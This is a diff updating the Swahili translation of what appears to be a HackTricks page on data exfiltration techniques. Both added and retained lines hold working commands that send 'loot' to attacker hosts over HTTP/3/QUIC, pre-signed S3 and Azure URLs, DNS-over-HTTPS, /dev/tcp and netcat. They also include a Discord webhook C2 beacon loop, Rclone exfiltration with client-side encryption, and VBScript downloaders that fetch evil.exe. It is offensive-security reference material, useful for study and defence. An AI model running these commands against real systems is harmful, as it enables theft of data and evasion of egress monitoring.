@@ -1,17 +1,17 @@
-# Exfiltration
+# Utoaji wa data
 
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> Kwa mfano wa mwisho-hadi-mwisho wa kuweka loot katika `C:\Users\Public` na kuifiltratea kwa Rclone ili kuiga backups za kawaida, pitia workflow hapa chini.
+> Kwa mfano wa hatua zote wa kuweka loot kwenye `C:\Users\Public` na kui-exfiltrate kwa kutumia Rclone ili kuiga backups halali, pitia workflow iliyo hapa chini.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Commonly whitelisted domains to exfiltrate information
+## Domains zinazoruhusiwa mara nyingi kwa ajili ya ku-exfiltrate taarifa
 
-Angalia [https://lots-project.com/](https://lots-project.com/) ili kupata domains zinazowekewa whitelist kwa kawaida zinazoweza kutumiwa vibaya
+Angalia [https://lots-project.com/](https://lots-project.com/) ili kupata domains zinazoruhusiwa mara nyingi ambazo zinaweza kutumiwa vibaya
 
 ## Copy\&Paste Base64
 
@@ -49,11 +49,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Pakia faili
+### Kupakia faili
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python module [uploadserver](https://pypi.org/project/uploadserver/):
+- Moduli ya Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -66,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Server**
+### **Seva ya HTTPS**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -107,11 +107,55 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+### HTTP/3 / QUIC
+
+Ikiwa vidhibiti vya egress vimewekwa kwa ukaguzi wa kawaida wa **TCP/443** lakini ni legevu kwa **UDP/443**, kulazimisha **HTTP/3** kunaweza kuhamisha uhamishaji hadi **QUIC** badala ya TLS-over-TCP. Endpoint ya mshambuliaji inahitaji usaidizi wa asili wa HTTP/3 (kwa mfano, reverse proxy au endpoint ya upload ambayo tayari inatangaza `Alt-Svc: h3`).
+```bash
+# Strict: fail if QUIC/H3 is not available
+curl --http3-only -T loot.7z https://attacker-h3.example/upload
+
+# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
+curl --http3 -T loot.7z https://attacker-h3.example/upload
+
+# Learn the server's Alt-Svc advertisement and reuse it
+curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
+curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
+```
+Utafiti wa 2025 (QUIC-Exfil) ulionyesha kuwa vipengele vya QUIC kama vile vichwa vilivyosimbwa kwa njia fiche na uhamishaji wa muunganisho vinaweza kufanya utambuzi wa exfiltration katika kiwango cha firewall kuwa mgumu zaidi kuliko njia za kawaida za TLS au DNS, hivyo tarajia eneo hili kuwa muhimu zaidi kadiri usaidizi wa HTTP/3 unavyoenea.
+
+### Upakiaji wa object-storage wa pre-signed / delegated
+
+Unapoweza kuunda au kupata **signed URL** yenye muda mfupi wa uhalali, mwathiriwa anahitaji tu client ya kawaida ya HTTPS. Hii huepuka kusakinisha cloud SDK au credentials za muda mrefu kwenye host na hufanana na traffic ya kawaida ya object-storage.
+
+**Linux / macOS (AWS S3 pre-signed `PUT`)**
+```bash
+curl -X PUT -T loot.7z \
+-H 'Content-Type: application/octet-stream' \
+'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
+```
+**Windows PowerShell (AWS S3 pre-signed `PUT`)**
+```powershell
+Invoke-WebRequest -Method Put -InFile .\loot.7z `
+-ContentType 'application/octet-stream' `
+-Uri $presignedUrl
+```
+**Azure Blob SAS URL**
+```bash
+curl -X PUT --data-binary @loot.7z \
+-H 'x-ms-blob-type: BlockBlob' \
+-H 'Content-Type: application/octet-stream' \
+'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
+```
+Notes:
+- Pre-signed URLs / SAS tokens kwa kawaida huweka mipaka ya **path**, **HTTP method**, na **expiration**.
+- Kwa Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` ni lazima.
+- Muundo huu hufanya kazi vizuri na `curl`, `Invoke-WebRequest`, au implant yoyote maalum inayoweza kutuma `HTTPS PUT` ghafi.
+
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) ni mbadala wa single-binary kwa `python3 -m http.server`
-yenye upload, download, WebDAV, SFTP, SMB, TLS, uthibitishaji, viungo vya kushiriki,
-na vipengele vya OOB collaboration (DNS, SMTP, NTLM hash capture).
+[goshs](https://github.com/patrickhener/goshs) ni mbadala wa binary moja wa `python3 -m http.server`
+wenye upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
+na vipengele vya ushirikiano vya OOB (DNS, SMTP, NTLM hash capture).
 ```bash
 # Serve current directory on port 8000
 goshs
@@ -140,14 +184,14 @@ goshs -smtp -smtp-domain [REDACTED]
 # Tunnel via localhost.run (no port forwarding needed)
 goshs -tunnel
 ```
-## Webhooks (Discord/Slack/Teams) za C2 & Data Exfiltration
+## Webhooks (Discord/Slack/Teams) kwa C2 na Data Exfiltration
 
-Webhooks ni HTTPS endpoints za kuandika tu ambazo hupokea JSON na sehemu za faili za hiari. Mara nyingi huruhusiwa kwa trusted SaaS domains na hazihitaji OAuth/API keys, hivyo zinafaa kwa beaconing na exfiltration yenye msuguano mdogo.
+Webhooks ni HTTPS endpoints za kuandika pekee zinazokubali JSON na sehemu za faili za hiari. Kwa kawaida zinaruhusiwa kwenye trusted SaaS domains na hazihitaji OAuth/API keys, hivyo kuzifanya zifae kwa beaconing na exfiltration yenye msuguano mdogo.
 
 Mawazo muhimu:
-- Endpoint: Discord hutumia https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data na sehemu inayoitwa payload_json yenye {"content":"..."} na sehemu za faili za hiari zinazoitwa file.
-- Muundo wa loop wa operator: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK huthibitisha delivery.
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data yenye sehemu inayoitwa payload_json iliyo na {"content":"..."} na sehemu za faili za hiari zinazoitwa file.
+- Operator loop pattern: beacon ya mara kwa mara -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK inathibitisha delivery.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -217,9 +261,9 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-Notes:
-- Mifumo inayofanana inatumika kwa majukwaa mengine ya ushirikiano (Slack/Teams) kwa kutumia incoming webhooks zao; rekebisha URL na JSON schema ipasavyo.
-- Kwa DFIR ya Discord Desktop cache artifacts na webhook/API recovery, angalia:
+Vidokezo:
+- Mifumo inayofanana inatumika kwa collaboration platforms nyingine (Slack/Teams) kwa kutumia incoming webhooks; rekebisha URL na JSON schema ipasavyo.
+- Kwa DFIR ya Discord Desktop cache artifacts na urejeshaji wa webhook/API, tazama:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -227,11 +271,11 @@ Notes:
 
 ## Rclone (cloud/object-storage exfiltration)
 
-Waendeshaji wa kisasa mara nyingi **hu-stage loot locally** kisha hutumia [Rclone](https://rclone.org/) kufanya uhamisho uonekane kama backup ya kawaida au kazi ya sync. Mchoro wa vitendo ni:
+Waendeshaji wa kisasa mara nyingi **hustage loot ndani ya mfumo** na kisha kutumia [Rclone](https://rclone.org/) ili kufanya uhamishaji uonekane kama backup au sync job ya kawaida. Muundo wa vitendo ni:
 
 1. Remote ya kawaida (`s3`, `webdav`, `drive`, `mega`, ...)
-2. Wrapper ya `crypt` ili **contents na filenames zifanyiwe encryption upande wa client**
-3. Wrapper ya hiari ya `chunker` ikiwa provider inaweka limits za object-size au unataka units ndogo za upload
+2. Wrapper ya `crypt` ili **contents na filenames zisimbwe kwa njia ya encryption upande wa client**
+3. Wrapper ya hiari ya `chunker` ikiwa provider inaweka mipaka ya object-size au unataka upload units ndogo zaidi
 ```bash
 # 1) Create the storage backend remote (interactive)
 rclone config              # ex: remote
@@ -247,10 +291,15 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 --transfers 2 --checkers 2 --bwlimit 4M
 # If you created the chunker wrapper, upload to overlay:... instead
 ```
-Maelezo:
-- `crypt` inaweza kusimba maudhui ya faili na majina pia.
-- `chunker` hugawa faili kubwa kwa uwazi na kuziunganisha tena wakati wa kupakua.
-- `rclone.conf` huhifadhi siri za `crypt` kwa njia iliyofichwa, si ulinzi thabiti wa data iliyohifadhiwa. Kwa shughuli za muda mfupi, tumia config ya muda iliyojitolea na uiondoe baadaye.
+Notes:
+- `crypt` inaweza kusimba kwa njia fiche maudhui ya faili pamoja na majina yake.
+- `chunker` hugawanya faili kubwa kwa uwazi na kuziunganisha tena zinapopakuliwa.
+- `rclone.conf` huhifadhi secrets za `crypt` katika mfumo wa **obscured**, si ulinzi madhubuti wa data iliyo kwenye storage. Kwa operations za muda mfupi, pendelea config maalum ya muda na uifute baadaye. Ikiwa ni lazima uihifadhi kwa muda mrefu zaidi, pendelea utunzaji wa config uliosimbwa kwa njia fiche (`RCLONE_CONFIG_PASS` / `--password-command`) badala ya kuacha `rclone.conf` tupu kwenye disk.
+- Ikiwa target tayari inasynci **OneDrive**, **Google Drive**, au **Dropbox**, kunakili loot ndani ya directory inayosynciwa kunaweza kutumia client iliyoidhinishwa tayari badala ya ku-deploy transfer binary mpya.
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
+{{#endref}}
 
 ## FTP
 
@@ -259,12 +308,12 @@ Maelezo:
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP server (NodeJS)
+### Seva ya FTP
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP server (pure-ftp)
+### Seva ya FTP (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -282,7 +331,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Mteja wa Windows**
+### Mteja wa **Windows**
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -302,7 +351,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Au itengeneze smb share **kwa kutumia samba**:
+Au unda smb share **kwa kutumia samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -326,8 +375,8 @@ WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.1
 WindPS-2> cd new_disk:
 ```
 ### goshs
-[goshs](https://github.com/patrickhener/goshs) ni mbadala wa single-binary
-unaohudumia faili kupitia SMB na kunasa NetNTLMv2 hashes kutoka kwa clients wanaounganisha:
+[goshs](https://github.com/patrickhener/goshs) ni mbadala wa binary moja
+unaohudumia faili kupitia SMB na kunasa hashes za NetNTLMv2 kutoka kwa wateja wanaounganishwa:
 ```bash
 # Start SMB server with NTLM hash capture
 goshs -smb -smb-domain CORP
@@ -343,7 +392,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Ikiwa mwathiriwa ana SSH, mshambuliaji anaweza kupachika saraka kutoka kwa mwathiriwa kwenda kwa mshambuliaji.
+Ikiwa mwathiriwa ana SSH, mshambuliaji anaweza ku-mount directory kutoka kwa mwathiriwa kwenda kwa mshambuliaji.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -356,19 +405,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Pakua faili kutoka kwa victim
+### Pakua faili kutoka kwa mwathiriwa
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Pakia file kwenye victim
+### Pakia faili kwa victim
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-asante kwa **@BinaryShadow\_**
+shukrani kwa **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -390,7 +439,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## DNS over HTTPS (DoH)
 
-Ikiwa classic UDP/53 DNS ni kelele au imezuiwa lakini outbound HTTPS inaruhusiwa kwa upana, muundo wa kawaida wa DNS-label exfiltration unaweza kufungwa ndani ya maombi ya **DoH** kwenda kwa public resolver. Hifadhi kila label ikiwa chini sana ya kikomo cha 63-byte cha DNS na tumia alfabeti salama kwa DNS kama Base32.
+Ikiwa classic UDP/53 DNS ina kelele nyingi au imezuiwa lakini HTTPS ya kutoka inaruhusiwa kwa upana, muundo wa kawaida wa DNS-label exfiltration unaweza kufungwa ndani ya maombi ya **DoH** kwa public resolver. Weka kila label chini sana ya kikomo cha DNS cha baiti 63 na utumie alfabeti salama kwa DNS kama Base32.
 ```bash
 # Encode -> split into DNS-safe labels -> send via DoH
 base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
@@ -401,25 +450,25 @@ curl --http2 -s \
 >/dev/null
 done
 ```
-Kwenye authoritative DNS server kwa `exf.attacker.tld`, panga queries kwa numeric prefix na kisha reconstruct Base32 stream. Hii huweka transport ndani ya HTTPS kuelekea resolver badala ya classic UDP/53 DNS.
+Kwenye authoritative DNS server ya `exf.attacker.tld`, panga queries kulingana na numeric prefix na ujenge upya Base32 stream. Hii huweka transport ndani ya HTTPS kuelekea resolver badala ya classic UDP/53 DNS.
 
-Kwa full bidirectional DNS tunnel tooling (`iodine`, `dnscat2`, etc.), angalia [the tunneling page](tunneling-and-port-forwarding.md).
+Kwa tooling kamili ya bidirectional DNS tunnel (`iodine`, `dnscat2`, n.k.), angalia [ukurasa wa tunneling](tunneling-and-port-forwarding.md).
 
 ## **SMTP**
 
-Ikiwa unaweza kutuma data kwa SMTP server, unaweza kuunda SMTP ili kupokea data kwa python:
+Ikiwa unaweza kutuma data kwenye SMTP server, unaweza kuunda SMTP ya kupokea data kwa kutumia python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) inaweza kuanzisha haraka SMTP server
-ili kunasa email callbacks wakati wa hali za OOB exfiltration:
+[goshs](https://github.com/patrickhener/goshs) inaweza kuanzisha SMTP server ya haraka
+kwa ajili ya kupokea email callbacks wakati wa hali za OOB exfiltration:
 ```bash
 # Start SMTP callback server
 goshs -smtp -smtp-domain [REDACTED]
 ```
-Barua pepe zilizopokelewa na callbacks zinaonyeshwa moja kwa moja katika output ya terminal.
+Barua pepe zilizopokelewa na callbacks huonyeshwa moja kwa moja kwenye matokeo ya terminali.  
 Inaweza kuunganishwa na DNS callback server kwa full OOB coverage:
 ```bash
 # DNS + SMTP combined
@@ -427,27 +476,27 @@ goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 ```
 ## TFTP
 
-Kwa chaguo-msingi katika XP na 2003 (katika zingine inahitaji kuongezwa waziwazi wakati wa usakinishaji)
+Kwa chaguo-msingi katika XP na 2003 (katika nyingine, inahitaji kuongezwa waziwazi wakati wa usakinishaji)
 
-Katika Kali, **anza TFTP server**:
+Katika Kali, **anzisha TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Seva ya TFTP katika python:**
+**TFTP server katika Python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Katika **victim**, unganisha kwenye seva ya Kali:
+Kwenye **victim**, unganisha kwenye Kali server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Pakua faili kwa kutumia PHP oneliner:
+Pakua faili kwa kutumia oneliner ya PHP:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -455,7 +504,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**Mwathiriwa**
+**Mwathirika**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -489,15 +538,15 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Programu ya `debug.exe` haiwezeshi tu kuchunguza binaries bali pia ina **uwezo wa kuzirebuild kutoka hex**. Hii ina maana kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuzalisha faili la binary. Hata hivyo, ni muhimu kutambua kwamba debug.exe ina **kikomo cha kuassemble faili zenye ukubwa hadi 64 kb**.
+Programu ya `debug.exe` hairuhusu tu ukaguzi wa binaries, bali pia ina **uwezo wa kuzijenga upya kutoka kwenye hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kutengeneza faili la binary. Hata hivyo, ni muhimu kutambua kwamba debug.exe ina **kikomo cha ku-assemble faili zenye ukubwa wa hadi kb 64**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Kisha nakili-bandika maandishi hayo kwenye windows-shell na faili inayoitwa nc.exe itaundwa.
+Kisha nakili-bandika maandishi hayo kwenye windows-shell na faili iitwayo nc.exe itaundwa.
 
-## Marejeo
+## Marejeleo
 
 - [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 - [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
@@ -506,5 +555,7 @@ Kisha nakili-bandika maandishi hayo kwenye windows-shell na faili inayoitwa nc.e
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
+- [Uploading objects with presigned URLs - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
+- [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)
 
 {{#include ../banners/hacktricks-training.md}}
